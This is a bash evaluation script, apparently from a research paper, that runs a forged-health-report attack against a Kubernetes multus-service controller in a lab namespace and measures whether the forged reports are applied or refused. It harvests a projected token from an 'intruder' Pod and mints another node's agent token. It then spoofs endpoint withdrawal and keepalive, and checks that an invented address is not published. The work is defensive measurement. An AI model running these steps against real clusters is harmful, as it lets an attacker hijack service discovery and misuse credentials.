#!/usr/bin/env bash
# The forged-health-report attack, run against whatever is deployed.
#
# Establishes a healthy victim endpoint the legitimate way, then, from a process
# holding no agent credential, forges health evidence for it and measures what
# the Service resolves to. Before G2 this removed/retained endpoints at will;
# after G2 the same attacker is refused at the transport. The script reports the
# numbers either way -- it is the before/after figure for the paper.
#
# ATTACKER=strong gives the attacker what any Pod creator has: the controller CA
# (public) and a valid Pod-bound token for the controller's audience, projected
# by its own Pod spec on the victim's node. Run against --auth-mode none, token
# and full to separate "no authentication", "authentication only" and producer
# authorization (G2).
set -u

NS=${NS:-ms-attack}
SVC=amf-victim
SLICE="$SVC-secondary-ipv4"
CTRL_NS=${CTRL_NS:-multus-service-system}
CTRL=${CTRL:-multus-service-controller}
NODE=${NODE:-$(hostname)}
TARGET_IP=${TARGET_IP:-10.216.0.200}
FIXTURES="$(cd "$(dirname "$0")/../test/fixtures" && pwd)"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

ok()   { printf '  \033[32m%s\033[0m %s\n' "OBSERVED" "$1"; }
bad()  { printf '  \033[31m%s\033[0m %s\n' "NOT SEEN" "$1"; }
head_(){ printf '\n\033[1m%s\033[0m\n' "$1"; }
retry(){ local d=$(( $(date +%s)+$1 )); shift; while :; do eval "$@" && return 0; [ "$(date +%s)" -ge "$d" ] && return 1; sleep 0.5; done; }
k(){ kubectl -n "$NS" "$@"; }

dns(){ k exec dnsprobe -- nslookup "$SVC.$NS.svc.cluster.local" 2>/dev/null | awk '/^Address/{print $NF}' | grep -v ':53$'; }
# fraction of a window the victim IP is present in DNS
dns_presence() {
  local secs=$1 present=0 total=0
  local end=$(( $(date +%s)+secs ))
  while [ "$(date +%s)" -lt "$end" ]; do
    total=$((total+1))
    dns | grep -q "^$VIP$" && present=$((present+1))
    sleep 0.5
  done
  echo "$present/$total"
}

cleanup(){ head_ "cleanup"; kubectl delete ns "$NS" --ignore-not-found --wait=false >/dev/null 2>&1; rm -f /tmp/spoof-ca.crt /tmp/spoof-token; "$FIXTURES/lab.sh" down >/dev/null 2>&1; }
trap cleanup EXIT

head_ "setup: healthy victim endpoint, published the legitimate way"
kubectl get ns "$NS" >/dev/null 2>&1 && { kubectl delete ns "$NS" --wait=false >/dev/null 2>&1; retry 240 '! kubectl get ns "$NS" >/dev/null 2>&1'; }
kubectl create ns "$NS" >/dev/null
"$FIXTURES/lab.sh" up-local >/dev/null

cat <<EOP | kubectl apply -f - >/dev/null
apiVersion: k8s.cni.cncf.io/v1
kind: NetworkAttachmentDefinition
metadata:
  name: sec-victim
  namespace: $NS
  annotations:
    secondary-service.boanlab.io/probe-scope: endpoint
    secondary-service.boanlab.io/health-target: "$TARGET_IP"
spec:
  config: '{"cniVersion":"0.3.1","name":"sec-victim","plugins":[{"type":"macvlan","master":"mslab0","mode":"bridge","ipam":{"type":"host-local","ranges":[[{"subnet":"10.216.0.0/24","rangeStart":"10.216.0.10","rangeEnd":"10.216.0.99"}]]}}]}'
---
apiVersion: k8s.cni.cncf.io/v1
kind: NetworkAttachmentDefinition
metadata: {name: sec-victim-target, namespace: $NS}
spec:
  config: '{"cniVersion":"0.3.1","name":"sec-victim-target","plugins":[{"type":"macvlan","master":"mslab0","mode":"bridge","ipam":{"type":"static","addresses":[{"address":"$TARGET_IP/24"}]}}]}'
---
apiVersion: v1
kind: Service
metadata:
  name: $SVC
  namespace: $NS
  annotations:
    secondary-service.boanlab.io/network: sec-victim
    secondary-service.boanlab.io/workload-selector: app=victim
spec:
  clusterIP: None
  ports: [{name: n2, port: 8080, protocol: TCP}]
---
apiVersion: v1
kind: Pod
metadata: {name: victim, namespace: $NS, labels: {app: victim}, annotations: {k8s.v1.cni.cncf.io/networks: sec-victim}}
spec:
  nodeSelector: {kubernetes.io/hostname: $NODE}
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
---
apiVersion: v1
kind: Pod
metadata: {name: tgt, namespace: $NS, annotations: {k8s.v1.cni.cncf.io/networks: sec-victim-target}}
spec:
  nodeSelector: {kubernetes.io/hostname: $NODE}
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
---
apiVersion: v1
kind: Pod
metadata: {name: dnsprobe, namespace: $NS}
spec:
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
EOP

retry 240 '[ "$(k get pod victim tgt dnsprobe --no-headers 2>/dev/null | grep -c Running)" = "3" ]' || { bad "fixtures never started"; exit 1; }
retry 120 'k get endpointslice "$SLICE" >/dev/null 2>&1'
retry 120 'k get endpointslice "$SLICE" -o jsonpath="{.endpoints[0].conditions.ready}" 2>/dev/null | grep -q true'
VIP=$(k get endpointslice "$SLICE" -o jsonpath='{.endpoints[0].addresses[0]}')

# Everything the attacker needs is derivable from cluster-visible objects.
PODUID=$(k get pod victim -o jsonpath='{.metadata.uid}')
AID=$(kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=15m 2>/dev/null \
      | grep '"event":"attachment_discovered"' | grep "\"pod_uid\":\"$PODUID\"" | tail -1 \
      | grep -o '"attachment_id":"[^"]*"' | cut -d'"' -f4)
IFACE=$(k get pod victim -o jsonpath='{.metadata.annotations.k8s\.v1\.cni\.cncf\.io/network-status}' \
        | python3 -c "import json,sys
for e in json.load(sys.stdin):
    if not e.get('default'): print(e['interface']); break")
CTRL_ADDR="$(kubectl -n "$CTRL_NS" get svc "$CTRL" -o jsonpath='{.spec.clusterIP}'):9090"
SERVER_NAME="$CTRL.$CTRL_NS.svc"
echo "  victim ip=$VIP attachment=$AID iface=$IFACE node=$NODE"
echo "  controller transport reachable at $CTRL_ADDR (server-name $SERVER_NAME)"

# Attacker credential material. A bare attacker has neither; a strong attacker
# has the CA (public) and a valid token from an ordinary Pod that is NOT an agent
# -- the closest a workload can get without being an authorized node agent.
ATTACKER=${ATTACKER:-strong}
SPOOF_TLS=(); SPOOF_TOK=()
if [ "$ATTACKER" = "strong" ]; then
  CA=/tmp/spoof-ca.crt
  kubectl -n "$CTRL_NS" get configmap controller-ca -o jsonpath='{.data.ca\.crt}' > "$CA" 2>/dev/null || true
  if [ -s "$CA" ]; then SPOOF_TLS=(--ca "$CA" --server-name "$SERVER_NAME"); echo "  attacker HAS the controller CA (it is not a secret)"; fi
  # An ordinary workload obtains a valid Pod-bound token for the controller's
  # audience with no special permission: it declares a projected token volume in
  # its own Pod spec, and it schedules itself onto the victim's node. Nobody
  # mints anything for it.
  kubectl -n "$NS" create sa intruder >/dev/null 2>&1 || true
  cat <<EOP | kubectl apply -f - >/dev/null 2>&1
apiVersion: v1
kind: Pod
metadata: {name: intruder, namespace: $NS}
spec:
  serviceAccountName: intruder
  nodeSelector: {kubernetes.io/hostname: $NODE}
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"],
                volumeMounts: [{name: tok, mountPath: /var/run/attack}]}]
  volumes:
    - name: tok
      projected: {sources: [{serviceAccountToken: {audience: health-controller, expirationSeconds: 3600, path: token}}]}
EOP
  retry 120 '[ "$(k get pod intruder -o jsonpath="{.status.phase}" 2>/dev/null)" = "Running" ]' >/dev/null
  TOKF=/tmp/spoof-token
  k exec intruder -- cat /var/run/attack/token > "$TOKF" 2>/dev/null || true
  if [ -s "$TOKF" ]; then SPOOF_TOK=(--token "$TOKF"); echo "  attacker HAS its own projected token (audience health-controller, SA intruder, on $NODE)"; fi
fi
SPOOFBIN=/tmp/spoof-bin
( cd "$ROOT" && go build -o "$SPOOFBIN" ./test/tools/spoof ) || { bad "cannot build spoof tool"; exit 1; }
spoof() { "$SPOOFBIN" "${SPOOF_TLS[@]}" "${SPOOF_TOK[@]}" "$@"; }
# The whole controller event stream for this run, parsed per window at the end.
MODE=${MODE:-unknown}; REP=${REP:-0}
CLOG=${CLOG:-/tmp/attack-ctrl-$MODE-$REP.log}
CPOD=$(kubectl -n "$CTRL_NS" get pod -l app="$CTRL" --field-selector=status.phase=Running -o jsonpath='{range .items[*]}{.metadata.creationTimestamp} {.metadata.name}{"\n"}{end}' | sort | tail -1 | awk '{print $2}')
kubectl -n "$CTRL_NS" logs -f "$CPOD" --since=5s > "$CLOG" 2>/dev/null & CLOG_PID=$!
now(){ date +%s%N; }
retry 30 'bash -c "exec 3<>/dev/tcp/${CTRL_ADDR%:*}/9090" 2>/dev/null' && ok "any workload can reach the transport; no NetworkPolicy, no credential" || bad "transport unreachable"

echo "  baseline DNS over 5s (no attacker):"
echo "    victim present: $(dns_presence 5)"

# ---------------------------------------------------------------- A1
head_ "A1  forge local_ready=false for a LIVE endpoint (T1: own projected token)"
A1_T0=$(now)
spoof --addr "$CTRL_ADDR" --node "$NODE" --instance attacker-a1 \
    --attachment "$AID" --nad "$NS/sec-victim" --interface "$IFACE" --ip "$VIP" \
    --attack withdraw --duration 20s > /tmp/spoof_a1.log 2>&1 &
SP=$!
sleep 4
A1_P=$(dns_presence 12)
echo "  victim DNS presence WHILE attacker runs: $A1_P"
wait $SP 2>/dev/null; A1_T1=$(now); tail -1 /tmp/spoof_a1.log | sed 's/^/  attacker: /'
retry 90 'dns | grep -q "^$VIP$"' >/dev/null || bad "victim did not return after A1"

# ---------------------------------------------------------------- T2
head_ "T2  a compromised node B: node-B agent credential, forging for a node-A endpoint"
OTHER=$(kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' | grep -v "^$NODE$" | head -1)
APOD=$(kubectl -n "$CTRL_NS" get pod -l app=multus-service-agent --field-selector spec.nodeName="$OTHER" -o jsonpath='{.items[0].metadata.name}')
AUID=$(kubectl -n "$CTRL_NS" get pod "$APOD" -o jsonpath='{.metadata.uid}')
TOKB=/tmp/spoof-token-nodeb
kubectl -n "$CTRL_NS" create token multus-service-agent --bound-object-kind Pod --bound-object-name "$APOD" \
  --bound-object-uid "$AUID" --audience health-controller --duration 1h > "$TOKB" 2>/dev/null
echo "  attacker holds $APOD's credential (node $OTHER); victim is on $NODE"
T2_T0=$(now)
"$SPOOFBIN" "${SPOOF_TLS[@]}" --token "$TOKB" --addr "$CTRL_ADDR" --node "$NODE" --instance attacker-t2 \
    --attachment "$AID" --nad "$NS/sec-victim" --interface "$IFACE" --ip "$VIP" \
    --attack withdraw --duration 20s > /tmp/spoof_t2.log 2>&1 &
SP=$!
sleep 4
T2_P=$(dns_presence 12)
echo "  victim DNS presence WHILE node-B credential forges: $T2_P"
wait $SP 2>/dev/null; T2_T1=$(now); tail -1 /tmp/spoof_t2.log | sed 's/^/  attacker: /'
retry 90 'dns | grep -q "^$VIP$"' >/dev/null || bad "victim did not return after T2"

# ---------------------------------------------------------------- A2
head_ "A2  keep a DEAD path published (T1)"
k delete pod tgt --wait=true >/dev/null 2>&1
retry 90 '! dns | grep -q "^$VIP$"' && ok "legitimately withdrawn once the path failed" || bad "endpoint did not withdraw on real failure"
A2_T0=$(now)
spoof --addr "$CTRL_ADDR" --node "$NODE" --instance attacker-a2 \
    --attachment "$AID" --nad "$NS/sec-victim" --interface "$IFACE" --ip "$VIP" \
    --attack keepalive --duration 20s > /tmp/spoof_a2.log 2>&1 &
SP=$!
sleep 4
A2_P=$(dns_presence 12)
echo "  victim DNS presence WHILE attacker forges health (path is dead): $A2_P"
wait $SP 2>/dev/null; A2_T1=$(now); tail -1 /tmp/spoof_a2.log | sed 's/^/  attacker: /'

# ---------------------------------------------------------------- G1
head_ "G1  forgery cannot invent an endpoint"
spoof --addr "$CTRL_ADDR" --node "$NODE" --instance attacker-g1 \
  --attachment deadbeefdeadbeef --nad "$NS/sec-victim" --interface net1 --ip 10.255.255.1 \
  --attack keepalive --duration 6s >/dev/null 2>&1 || true
sleep 2
if k get endpointslice "$SLICE" -o jsonpath='{.endpoints[*].addresses[0]}' 2>/dev/null | grep -q '10.255.255.1'; then
  G1R=published; bad "an invented address appeared in the slice"
else
  G1R=refused; ok "invented address never published"
fi
sleep 1; kill $CLOG_PID 2>/dev/null

# ---------------------------------------------------------------- per-window accounting from the controller log
head_ "summary"
python3 - "$CLOG" "$AID" "$MODE" "$REP" "$A1_T0" "$A1_T1" "$T2_T0" "$T2_T1" "$A2_T0" "$A2_T1" \
  "$A1_P" "$T2_P" "$A2_P" "$G1R" <<'PY'
import json, sys
log, aid, mode, rep = sys.argv[1:5]
w = {"a1": (int(sys.argv[5]), int(sys.argv[6])), "t2": (int(sys.argv[7]), int(sys.argv[8])),
     "a2": (int(sys.argv[9]), int(sys.argv[10]))}
pres = dict(zip(("a1", "t2", "a2"), sys.argv[11:14])); g1 = sys.argv[14]
ev = []
for line in open(log, errors="ignore"):
    line = line.strip()
    if line.startswith("{"):
        try: ev.append(json.loads(line))
        except ValueError: pass
out = ["RESULT", "mode=%s" % mode, "rep=%s" % rep]
for k, (t0, t1) in w.items():
    E = [e for e in ev if t0 <= e.get("ts", 0) <= t1 + 2_000_000_000]
    atk = "attacker-" + k
    applied = sum(1 for e in E if e.get("event") == "health_report_applied"
                  and e.get("attachment_id") == aid and str(e.get("agent_instance", "")).startswith(atk))
    takeover = sum(1 for e in E if e.get("event") == "agent_connected"
                   and str(e.get("agent_instance", "")).startswith(atk) and e.get("superseded"))
    rej = [e.get("reason", "") for e in E if e.get("event") == "stream_rejected"]
    nrej = [e.get("reason", "") for e in E if e.get("event") == "health_report_rejected"]
    reason = (rej[-1] if rej else (nrej[-1] if nrej else "-")).split(":")[0].replace(" ", "_")
    out += ["%s_presence=%s" % (k, pres[k]), "%s_applied=%d" % (k, applied), "%s_takeover=%d" % (k, takeover),
            "%s_reject=%s" % (k, reason)]
out.append("g1=%s" % g1)
print(" ".join(out))
PY
